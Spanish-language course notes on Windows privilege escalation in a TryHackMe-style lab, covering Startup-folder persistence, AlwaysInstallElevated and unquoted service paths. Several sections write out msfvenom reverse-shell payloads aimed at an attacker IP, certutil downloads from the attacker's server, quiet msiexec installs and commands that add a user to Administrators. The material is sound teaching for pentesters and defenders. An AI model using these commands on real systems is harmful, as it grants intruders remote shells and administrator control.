Documentos de Referencia: "AS-II - Escalada de privilegios en Windows.pdf"

# Informe Técnico: Escalada de Privilegios en Sistemas Windows

## 1. Resumen Ejecutivo
Este informe técnico aborda el tema de la escalada de privilegios en sistemas **Windows**, enfocándose en la matriz **MITRE ATT&CK** para identificar y explotar vulnerabilidades de configuración. Se introducen herramientas clave como **PowerUP** y se describen técnicas específicas como **AlwaysInstallElevated** y **Unquoted Service Path**. El informe concluye con una guía práctica para configurar un entorno de laboratorio vulnerable, ya sea de forma autónoma o utilizando plataformas como **TryHackMe**, lo que permite a los estudiantes practicar las técnicas de forma segura.

---

## 2. Conceptos Fundamentales

### Matriz MITRE ATT&CK
La matriz **MITRE ATT&CK** es un marco globalmente accesible de tácticas y técnicas adversarias basadas en observaciones del mundo real. Se utiliza como una base de conocimiento para la ciberseguridad, ayudando a los profesionales a categorizar y comprender las acciones de un atacante. Para la escalada de privilegios, la matriz contiene una variedad de técnicas aplicables tanto a sistemas **Windows** como a **Linux**. Aunque conceptualmente similares, la implementación de estas técnicas difiere significativamente debido a la arquitectura única de cada sistema operativo.

### Escalada de Privilegios en Windows
A diferencia de los sistemas Linux, donde técnicas como el **Path Hijacking** y los **Cronjobs** son comunes, la escalada de privilegios en **Windows** se enfoca en la explotación de la configuración del sistema. Algunas de las técnicas más notables incluyen:
* **Autorun**: Explotación de las características de ejecución automática del sistema.
* **AlwaysInstallElevated**: Una configuración de política de grupo que permite a los usuarios instalar paquetes de **Windows Installer** (`.msi`) con privilegios elevados.
* **Unquoted Service Path**: Una vulnerabilidad en la que la ruta a un archivo ejecutable de servicio no está encerrada entre comillas, lo que podría permitir a un atacante ejecutar código malicioso.
* **DLL Hijacking**: Similar al **Path Hijacking** en Linux, esta técnica consiste en sustituir una **DLL** legítima por una versión maliciosa para que se ejecute con privilegios elevados.
* **Scheduled Task/Job**: Equivalente a los **Cronjobs** en Linux, explota las tareas programadas en **Windows** para ejecutar código con privilegios elevados.

---

## 3. Procedimientos Prácticos

### 1. Herramientas de Enumeración
Para identificar vulnerabilidades en sistemas **Windows**, se utilizan herramientas especializadas de enumeración en la fase de post-explotación.
* **PowerUP**: Una herramienta de enumeración basada en **PowerShell** que busca configuraciones erróneas en el sistema. Se considera muy efectiva y su salida es fácil de interpretar.
* **WinPEAS**: Otra herramienta de enumeración popular, aunque su salida puede ser menos clara en algunos sistemas en comparación con **PowerUP**.

### 2. Configuración de un Entorno de Laboratorio
Para practicar estas técnicas de forma segura, se recomienda configurar un entorno de laboratorio vulnerable. Hay dos opciones principales para hacerlo:
* **Opción autónoma**: Desplegar una máquina virtual de **Windows 7** de 64 bits en un entorno como **VirtualBox**. Luego, se descarga y ejecuta el *script* `lpe_windows_setup.bat` del repositorio de **GitHub** `sagishahar/lpeworkshop`. Este *script* configura la máquina con múltiples vulnerabilidades intencionales. El repositorio también incluye herramientas de **Sysinternals** y soluciones en formato **PDF** para los ejercicios. Es importante asegurarse de que el usuario `user` no exista, ya que el *script* lo creará automáticamente para la escalada de privilegios.
* **Opción de TryHackMe**: Utilizar la sala gratuita "Windows PrivEsc" en la plataforma **TryHackMe**. Esta sala ya tiene un entorno vulnerable preconfigurado basado en el mismo *script* de **GitHub**. Para acceder a la máquina virtual, se debe descargar el archivo de configuración **OpenVPN** de la sala y conectarse a la red usando el comando `sudo openvpn <fichero>.ovpn`. Una vez conectado, el atacante puede acceder a la máquina **Windows** vulnerable de forma remota, por ejemplo, usando el comando `rdesktop -u user <ip_de_la_victima>`.

### 3. Ejecución del Ataque
El objetivo del laboratorio es pasar del usuario `user`, que tiene privilegios limitados, a un usuario con privilegios de administrador, como el usuario **TCM**.

* **Conexión al entorno**: En la opción de **TryHackMe**, el atacante se conecta a la red de la máquina víctima a través de la **VPN**. Una vez dentro, se autentica con las credenciales del usuario `user`.
* **Reconocimiento y escalada**: Con el usuario `user`, se utilizan las herramientas de enumeración para identificar una vulnerabilidad en el sistema. Luego, se explota la vulnerabilidad para obtener una *shell* con privilegios de `admin` o `SYSTEM`, completando la escalada de privilegios.

---

## 4. Conclusiones y Puntos Clave

### Importancia y Beneficios de Seguridad
La escalada de privilegios en **Windows** es una fase crítica en el ciclo de vida de un ataque. Comprender estas técnicas es fundamental para los profesionales de la ciberseguridad, ya que les permite simular ataques, evaluar la postura de seguridad de un sistema y aplicar las medidas preventivas adecuadas. Los laboratorios de práctica son una herramienta invaluable para adquirir esta experiencia de forma práctica y segura.

### Puntos de Aprendizaje Clave
* **Sistemas distintos, conceptos similares**: Aunque las técnicas de escalada de privilegios en **Windows** difieren de las de **Linux** en su aplicación, los conceptos subyacentes son a menudo los mismos: explotar configuraciones erróneas, fallas en el *kernel* o en la ejecución de programas para obtener privilegios más altos.
* **La enumeración es vital**: La fase de enumeración post-explotación es crucial. Herramientas como **PowerUP** facilitan la identificación de vulnerabilidades, lo que permite al atacante elegir la técnica de escalada más adecuada.
* **Práctica en un entorno seguro**: El uso de laboratorios como el de **GitHub** o el de **TryHackMe** es esencial para practicar y comprender estas técnicas sin poner en riesgo sistemas reales.

### Relevancia Técnica
El conocimiento de las técnicas de escalada de privilegios en **Windows** es altamente relevante en un entorno profesional. Es un requisito fundamental para roles como el de *pentester*, analista de seguridad y *red teamer*. La capacidad de moverse lateralmente y escalar privilegios es un indicador de la madurez de las capacidades de seguridad de una organización, y un dominio de estas técnicas permite a los profesionales identificar y mitigar proactivamente las debilidades del sistema.

---

Documentos de Referencia: "AS-II - Escalada de privilegios en Windows.pdf"

# Informe Técnico: Escalada de Privilegios y Persistencia en Windows Mediante el Directorio Startup

## 1. Resumen Ejecutivo
Este informe técnico aborda la escalada de privilegios en sistemas **Windows** explotando las características de inicio de sesión, como la carpeta **Startup** y las claves de registro **Run/RunOnce**. Se explica cómo un atacante con privilegios limitados puede usar la persistencia para lograr una escalada. La clave del ataque reside en si el atacante puede colocar un *payload* malicioso en un directorio al que un usuario privilegiado tenga acceso de escritura. Se detallan los pasos para lograr este ataque, incluyendo la generación y la inyección del *payload*, la configuración de la máquina del atacante y la obtención de una *reverse shell* con permisos de administrador.

---

## 2. Conceptos Fundamentales

### Opciones de Inicio de Sesión
Los sistemas **Windows** tienen funcionalidades que permiten a los programas ejecutarse automáticamente cuando un usuario inicia sesión. Hay dos ubicaciones principales para esto:
* **Carpeta Startup**: Un directorio del sistema donde cualquier archivo ejecutable colocado dentro se ejecutará automáticamente cuando el usuario se autentique o inicie sesión en la máquina. Hay dos ubicaciones para la carpeta de inicio: una para todos los usuarios y otra específica para cada usuario.
    * **Para todos los usuarios**: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`.
    * **Para un usuario específico**: `C:\Users\<User_Name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`.
* **Claves de Registro Run/RunOnce**: Se trata de entradas especiales en el registro de Windows que, al igual que la carpeta de inicio, se ejecutan cuando un usuario inicia sesión.
    * **Claves `Run`**: Los programas vinculados a estas claves se ejecutarán cada vez que un usuario inicie sesión. La persistencia es duradera.
    * **Claves `RunOnce`**: Los programas se ejecutarán solo una vez después del inicio de sesión, y la clave se eliminará del registro. La persistencia se obtiene una sola vez.

### La Vulnerabilidad
La vulnerabilidad principal reside en los permisos de escritura de la carpeta **Startup**. Si un atacante con privilegios limitados puede escribir en una carpeta de inicio que un usuario privilegiado (como un administrador o el usuario **SYSTEM**) utiliza, puede inyectar un *payload* malicioso que se ejecutará la próxima vez que el usuario privilegiado inicie sesión. Esto le permitiría escalar privilegios o establecer persistencia en el sistema.

---

## 3. Procedimientos Prácticos

### 1. Detección de la Vulnerabilidad
El primer paso es comprobar si el usuario no privilegiado tiene permisos de escritura en la carpeta de inicio global.

* **Herramientas de enumeración**: Se pueden utilizar herramientas de **Windows** como `icacls.exe` o `Accesschk` para revisar los permisos del directorio `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`.
* **Análisis de la salida**: En el laboratorio, el comando `icacls.exe` muestra que el grupo de usuarios `BUILTIN\Users` tiene **control total** (`(F)`) sobre la carpeta `Startup`. Esto confirma que el usuario no privilegiado (`user`), que pertenece a este grupo, puede leer, escribir y ejecutar archivos en ese directorio.

### 2. Creación e Inyección del Payload
Una vez que se confirma la vulnerabilidad de permisos, el atacante prepara su entorno para generar un *payload* y transferirlo a la máquina víctima.

* **Generación del *payload***: Se utiliza la herramienta `msfvenom` de **Metasploit** para crear un ejecutable (`.exe`) que establece una **reverse shell**. El comando de ejemplo es: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.87.236 LPORT=4444 -f exe -o autologon.exe`.
* **Configuración del servidor de escucha**: En la máquina del atacante, se configura un servidor web con `python3 -m http.server 80`. Luego, se configura **Metasploit** para que se ponga a la escucha del *payload* con `use exploit/multi/handler` y se establecen las opciones de `LHOST` y `LPORT`.
* **Transferencia del archivo**: El atacante transfiere el archivo `autologon.exe` a la máquina víctima. En este caso, se usa la utilidad integrada de **Windows** `certutil` para descargar el archivo desde el servidor web del atacante. El comando es `certutil -urlcache -split -f "http://10.8.87.236/autologon"`.
* **Inyección del *payload***: Una vez descargado, el atacante copia el archivo `autologon.exe` en el directorio **Startup** `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`.

### 3. Escalada y Obtención de Acceso
El atacante espera a que un usuario con privilegios de administrador, como el usuario `TCM` del laboratorio, inicie sesión en la máquina víctima.

* **Ejecución del *payload***: Cuando el usuario `TCM` inicia sesión, el archivo `autologon.exe` se ejecuta automáticamente.
* **Obtención de la *reverse shell***: El *payload* se conecta al oyente de **Metasploit** en la máquina del atacante, abriendo una **Meterpreter session**.
* **Verificación de privilegios**: El atacante ejecuta el comando `getuid` en la sesión de **Meterpreter** y confirma que la sesión se ejecuta bajo el contexto del usuario `TCM`, que es un administrador.

### 4. Alternativa: Detección con Autorun64.exe
Una alternativa de ataque consiste en buscar un ejecutable que ya esté configurado para ejecutarse en el inicio y que tenga permisos de escritura.

* **Herramienta `Autorun64.exe`**: Esta herramienta de **Sysinternals** muestra una lista completa de todas las aplicaciones de inicio automático, incluyendo las ubicaciones de la carpeta **Startup** y las claves de registro **Run/RunOnce**.
* **Identificación del objetivo**: Al ejecutar `Autorun64.exe` con un usuario no privilegiado, el atacante puede identificar una entrada del registro `Run` que apunta a un ejecutable en un directorio con permisos de escritura.
* **Inyección del *payload***: El atacante puede renombrar su *payload* `autologon.exe` a `program.exe` y colocarlo en la ruta del ejecutable vulnerable. La próxima vez que un usuario inicie sesión, se ejecutará el *payload* malicioso en lugar del programa original.

---

## 4. Conclusiones y Puntos Clave

### Importancia y Beneficios de Seguridad
La explotación de las opciones de inicio de sesión en **Windows** es una técnica común para la escalada de privilegios y la persistencia. Entender esta vulnerabilidad es vital para que los profesionales de la seguridad puedan proteger los sistemas de ataques. La principal medida preventiva es asegurar que los directorios y las claves de registro de inicio tengan permisos estrictos y que solo los usuarios autorizados puedan escribir en ellos.

### Puntos de Aprendizaje Clave
* **La enumeración es vital**: El éxito de este ataque depende completamente de una fase de enumeración exhaustiva para encontrar un directorio o clave de registro con permisos de escritura para el usuario atacante. Herramientas como `icacls.exe` y `Autorun64.exe` son indispensables en esta etapa.
* **La persistencia conduce a la escalada**: Al colocar un *payload* en una ubicación de inicio, el atacante puede esperar a que un usuario con privilegios elevados inicie sesión, lo que le permitirá obtener una *shell* con esos privilegios.
* **Múltiples vías de ataque**: El ataque puede llevarse a cabo tanto a través de directorios del sistema de archivos como a través de entradas del registro, lo que requiere un conocimiento detallado de ambas áreas del sistema operativo.

### Relevancia Técnica
El conocimiento de estas técnicas es un requisito fundamental para los *pentesters* y analistas de seguridad. La capacidad de explotar permisos de archivos mal configurados para lograr la escalada de privilegios es una habilidad básica para evaluar la seguridad de un sistema. Al practicar en entornos de laboratorio, los profesionales pueden dominar estas técnicas y, a su vez, desarrollar estrategias de defensa sólidas.

---

Documentos de Referencia: "AS-II - Escalada de privilegios en Windows.pdf"

# Informe Técnico: Escalada de Privilegios en Windows con AlwaysInstallElevated

## 1. Resumen Ejecutivo
Este informe técnico detalla el proceso de escalada de privilegios en sistemas **Windows** explotando la política **AlwaysInstallElevated**. Esta configuración de seguridad, si está habilitada, permite que cualquier usuario, incluso uno sin privilegios de administrador, instale paquetes de **Windows Installer** (`.msi`) con privilegios elevados. Se explican los pasos para detectar esta vulnerabilidad, crear un *payload* malicioso, inyectarlo en la máquina víctima y obtener una *reverse shell* con permisos de **SYSTEM**.

---

## 2. Conceptos Fundamentales

### La Política AlwaysInstallElevated
La política **AlwaysInstallElevated** es una configuración de seguridad que permite a usuarios no administradores ejecutar instalaciones de paquetes **MSI** con privilegios elevados. En un sistema **Windows**, el motor de instalación utiliza paquetes **MSI** para la instalación de aplicaciones. Por defecto, estas instalaciones requieren permisos de administrador. Sin embargo, si esta política está activa, cualquier usuario puede ejecutar instalaciones con privilegios de **SYSTEM**, el nivel de permisos más alto en **Windows**.

### Vulnerabilidad de Configuración
La política `AlwaysInstallElevated` crea una vulnerabilidad de configuración crítica al anular la seguridad predeterminada de **Windows** que restringe las instalaciones a usuarios con permisos de administrador. Si un atacante encuentra esta política habilitada en el sistema de una víctima, puede engañar al sistema para que ejecute su código con privilegios elevados a través de un mecanismo de instalación legítimo.

---

## 3. Procedimientos Prácticos

### 1. Detección de la Vulnerabilidad
La primera fase del ataque es la **enumeración** para determinar si la política `AlwaysInstallElevated` está activa en la máquina víctima. Para ello, el atacante debe consultar dos claves de registro específicas:
* `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
* `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`

Si el valor de estas claves de registro está configurado en `1`, el instalador de **Windows** tendrá privilegios elevados, y la escalada será posible. El comando `reg query` se utiliza para verificar estos valores.

### 2. Creación e Inyección del Payload
Una vez confirmada la vulnerabilidad, el atacante procede a crear un paquete **MSI** malicioso que contenga un *payload*.

* **Generación del *payload***: Se utiliza la herramienta **msfvenom** para encapsular un **Meterpreter reverse shell** en un archivo `.msi`. El comando de ejemplo es: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.87.236 LPORT=5555 -f msi -o always.msi`.
* **Transferencia del archivo**: El atacante transfiere el archivo `always.msi` a la máquina víctima. Esto se puede lograr levantando un servidor web con **Python** y usando una utilidad de **Windows**, como `certutil`, para descargar el archivo.
* **Análisis de archivos**: El atacante puede utilizar el comando `dir` en el **CMD** de **Windows** para verificar que el archivo `always.msi` se ha descargado correctamente.

### 3. Ejecución del Paquete MSI y Obtención de la Shell
Finalmente, el atacante ejecuta el instalador malicioso y obtiene el control de la máquina.

* **Configuración del oyente**: Antes de ejecutar el archivo, el atacante configura un oyente en su máquina con **Metasploit** para recibir la conexión de la *reverse shell*. Se configuran el tipo de *payload* y las direcciones **LHOST** y **LPORT** correspondientes.
* **Ejecución de la instalación**: Desde una sesión de bajos privilegios en la máquina víctima, el atacante ejecuta el paquete **MSI** utilizando el comando `msiexec /quiet /qn /i always.msi`. Las opciones `/quiet` y `/qn` eliminan los mensajes de la instalación y la interfaz gráfica, respectivamente, para evitar levantar sospechas.
* **Obtención de la *shell* de **SYSTEM***: La instalación, ejecutada con privilegios de **SYSTEM** gracias a la política `AlwaysInstallElevated`, activará la *reverse shell* y se conectará de nuevo a la máquina del atacante. El atacante tendrá una **Meterpreter session** abierta con privilegios de **SYSTEM**.

### Alternativas de Ataque
Como alternativa a generar una *reverse shell*, el atacante podría usar **msfvenom** para crear un instalador que simplemente añada a su usuario al grupo de administradores locales. El comando para esto es: `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi`. Adicionalmente, se puede utilizar un módulo de **Metasploit** llamado `exploit/windows/local/always_install_elevated`, que automatiza la detección y explotación de esta vulnerabilidad.

---

## 4. Conclusiones y Puntos Clave

### Importancia y Beneficios de Seguridad
La escalada de privilegios a través de `AlwaysInstallElevated` es una técnica común que subraya la importancia de una configuración de seguridad adecuada en sistemas **Windows**. El principal beneficio de entender esta vulnerabilidad es que los administradores pueden revisar y deshabilitar esta política si no es necesaria, eliminando un vector de ataque directo y eficaz.

### Puntos de Aprendizaje Clave
* **El registro es clave**: El registro de **Windows** es la fuente principal para identificar esta vulnerabilidad. El conocimiento de las claves de registro relevantes es fundamental para la fase de enumeración.
* **La explotación es inmediata**: Si la política está activada, el proceso de escalada de privilegios es "casi automático", ya que el atacante puede aprovechar un mecanismo legítimo del sistema para ejecutar su código con permisos de **SYSTEM**.
* **Herramientas de ataque y defensa**: Herramientas como `msfvenom`, `certutil` y **Metasploit** son esenciales para realizar el ataque. A la inversa, los administradores pueden utilizarlas para probar sus propias configuraciones de seguridad.

### Relevancia Técnica
El dominio de la escalada de privilegios con `AlwaysInstallElevated` es una habilidad crucial en el campo de la ciberseguridad ofensiva. Es un requisito fundamental para los *pentesters*, ya que les permite evaluar la seguridad de los sistemas de clientes y, a su vez, proporciona a los defensores el conocimiento necesario para endurecer sus sistemas contra este tipo de ataques.

---

Documentos de Referencia: "AS-II - Escalada de privilegios en Windows.pdf"

# Informe Técnico: Escalada de Privilegios en Windows con Unquoted Service Path

## 1. Resumen Ejecutivo
Este informe técnico detalla una técnica común de escalada de privilegios en sistemas **Windows**: la explotación de un servicio con ruta sin comillas (**Unquoted Service Path**). La vulnerabilidad surge cuando la ruta a un ejecutable de servicio contiene espacios y no está encerrada entre comillas. Si un atacante puede escribir en uno de los directorios de la ruta, puede colocar un *payload* malicioso para que el servicio lo ejecute con sus privilegios elevados. Se explican los pasos para identificar esta mala configuración y se demuestra cómo un usuario no privilegiado puede obtener acceso como administrador.

---

## 2. Conceptos Fundamentales

### Service Path y Unquoted Service Path
Un **Service Path** es la ruta donde se encuentra el archivo ejecutable (`.exe`) de un servicio de **Windows**. Si esta ruta no está entrecomillada (`"service path"`) y contiene espacios en blanco, se crea una vulnerabilidad. El sistema operativo, en lugar de buscar la ruta completa, puede interpretar cada espacio en blanco como una división, buscando un archivo ejecutable en cada segmento de la ruta.

Por ejemplo, si la ruta legítima es `C:\Program Files\Vuln Service\file.exe`, el sistema buscaría y ejecutaría:
* `C:\Program.exe`.
* `C:\Program Files\Vuln.exe`.
* Y finalmente, `C:\Program Files\Vuln Service\file.exe`.

### Objetos y Permisos en Windows
En **Windows**, los objetos como servicios, archivos y entradas del registro tienen permisos y privilegios detallados que controlan el acceso. Un atacante puede explotar la vulnerabilidad de un servicio sin comillas solo si, además de la ruta mal configurada, tiene permisos de escritura en uno de los directorios de esa ruta.

---

## 3. Procedimientos Prácticos

### 1. Detección de la Vulnerabilidad y Permisos
El proceso comienza con una sesión de bajos privilegios para identificar servicios vulnerables.

* **Identificación del usuario**: Se usa el comando `net user user` para confirmar que el usuario actual no pertenece a grupos privilegiados como **`Administrators`**, lo que lo convierte en un punto de partida ideal para la escalada.
* **Enumeración de servicios**: Se utilizan herramientas de enumeración automatizada como **PowerUp** o **WinPEAS**. El *script* `PowerUp.ps1` tiene un comando llamado `Get-UnquotedService` que extrae las rutas de los binarios y verifica si tienen espacios sin comillas.
* **Análisis del resultado**: El `output` de la enumeración revela el servicio `unquotedsvc` con una ruta vulnerable: `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`. También indica que el grupo `BUILTIN\Users` tiene permisos de escritura en el directorio `C:\Program Files\Unquoted Path Service\`. El comando `icacls.exe` se puede usar para confirmar estos permisos de forma más granular.
* **Revisión del servicio**: El comando `sc qc unquotedsvc` se utiliza para verificar la configuración del servicio y confirmar la ruta del binario y el nivel de privilegios con el que se ejecuta.

### 2. Creación e Inyección del Payload
Una vez confirmada la vulnerabilidad, el atacante crea y coloca un *payload* malicioso en el directorio con permisos de escritura.

* **Generación del *payload***: Usando **msfvenom** en la máquina atacante (Kali), se crea un ejecutable que añada al usuario actual al grupo de administradores. El comando es: `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`. Se elige este *payload* como una alternativa a una *reverse shell*.
* **Transferencia del archivo**: El archivo `common.exe` se transfiere a la máquina víctima utilizando `certutil` para descargarlo desde un servidor web levantado en Kali.
* **Inyección del archivo**: El atacante coloca el archivo `common.exe` en el directorio vulnerable `C:\Program Files\Unquoted Path Service\`, aprovechando la ruta sin comillas para que el sistema lo ejecute antes del archivo legítimo.

### 3. Ejecución y Verificación
Para activar el ataque, se reinicia el servicio vulnerable y se comprueban los privilegios.

* **Reinicio del servicio**: El atacante reinicia el servicio `unquotedsvc` con el comando `sc start unquotedsvc`. Esto obliga al sistema a buscar y ejecutar la ruta del binario.
* **Ejecución del *payload***: El sistema encuentra y ejecuta el *payload* `common.exe` en lugar del archivo legítimo. El *payload* se ejecuta con los privilegios del servicio (generalmente **SYSTEM**) y añade al usuario `user` al grupo de administradores.
* **Verificación final**: El atacante ejecuta de nuevo `net user user`. El nuevo `output` muestra que el usuario `user` ahora pertenece al grupo **`Administrators`**.

---

## 4. Conclusiones y Puntos Clave

### Importancia y Beneficios de Seguridad
La explotación de servicios con rutas sin comillas es una técnica que subraya la importancia de una configuración de seguridad estricta en **Windows**. Los administradores deben asegurarse de que todas las rutas de servicio estén entre comillas para prevenir que un atacante inyecte código malicioso en rutas de acceso más cortas. Comprender esta técnica permite a los profesionales de la ciberseguridad identificar y mitigar este riesgo de forma proactiva.

### Puntos de Aprendizaje Clave
* **El sistema "adivina" las rutas**: La vulnerabilidad se basa en el comportamiento predeterminado del sistema operativo al resolver rutas que contienen espacios y no están entrecomilladas.
* **La enumeración es el primer paso**: La fase de enumeración con herramientas como **PowerUp** es crucial para identificar los servicios vulnerables y los permisos de escritura necesarios para ejecutar el ataque.
* **El contexto del servicio es clave**: El *payload* se ejecuta con los privilegios del servicio, lo que permite a un usuario no privilegiado escalar a privilegios de **SYSTEM** o administrador.

### Relevancia Técnica
El **Unquoted Service Path** es una técnica común en el *pentesting* y el *red teaming* en entornos **Windows**. El dominio de esta técnica es una habilidad fundamental para cualquier profesional de la ciberseguridad, ya que demuestra la capacidad de evaluar y explotar configuraciones débiles en un sistema para escalar privilegios.